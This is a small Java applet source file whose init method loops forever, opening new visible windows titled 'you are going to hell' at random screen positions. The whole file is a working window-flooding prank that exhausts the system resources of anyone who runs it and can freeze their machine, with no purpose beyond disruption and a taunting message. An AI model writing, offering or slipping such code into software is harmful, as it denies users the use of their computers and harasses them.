import java.awt.*;
import java.applet.Applet;
import java.util.Random;
/*<applet code="FrameInfinite.java" width=500 height=500></applet>*/
public class FrameInfinite extends Applet{
	public void init(){
        for(;;){
        	new Framer("you are going to hell");

        }
	}
	public void paint(Graphics g){}
	public void start(){
		repaint();
	}
}
class Framer extends Frame{
	Random Rand=new Random();
	public Framer(String Title){
		super(Title);
		setLocation(Rand.nextInt(1080),Rand.nextInt(720));
		setVisible(true);
		setSize(400,300);
	}
}
